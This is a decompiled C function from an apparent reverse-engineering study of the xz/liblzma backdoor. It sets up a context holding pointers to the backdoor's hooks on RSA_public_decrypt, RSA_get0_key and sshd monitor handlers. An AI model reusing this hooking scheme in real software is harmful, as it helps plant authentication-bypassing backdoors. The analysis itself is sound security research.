// /home/kali/xzre-ghidra/xzregh/1027D0_init_hooks_ctx.c
// Function: init_hooks_ctx @ 0x1027D0
// Calling convention: unknown
// Prototype: undefined init_hooks_ctx(void)


/*
 * AutoDoc:         Primes the transient `backdoor_hooks_ctx_t` with pointers to the shared hooks blob, the
 * audit shim (`backdoor_symbind64`), and the mm/EVP hook entry points. When `shared` is still NULL it
 *         seeds the structure with the static hook addresses and returns 0x65 so the caller can retry
 *         once the shared globals are available; otherwise it returns 0 to signal that hook setup may
 *         proceed.
 *     
 */
#include "xzre_types.h"


undefined8 init_hooks_ctx(long param_1)

{
  undefined8 uVar1;
  int status;
  
  uVar1 = 5;
  if (param_1 != 0) {
    *(undefined8 **)(param_1 + 0x38) = &hooks_data;
    uVar1 = 0;
    if (*(long *)(param_1 + 0x30) == 0) {
      *(undefined8 *)(param_1 + 0x68) = 4;
      *(undefined1 **)(param_1 + 0x40) = &LAB_001028d0;
      *(code **)(param_1 + 0x48) = hook_RSA_public_decrypt;
      *(code **)(param_1 + 0x50) = hook_RSA_get0_key;
      *(code **)(param_1 + 0x58) = mm_log_handler_hook;
      *(code **)(param_1 + 0x70) = mm_answer_keyallowed_hook;
      *(code **)(param_1 + 0x78) = mm_answer_keyverify_hook;
      uVar1 = 0x65;
    }
  }
  return uVar1;
}

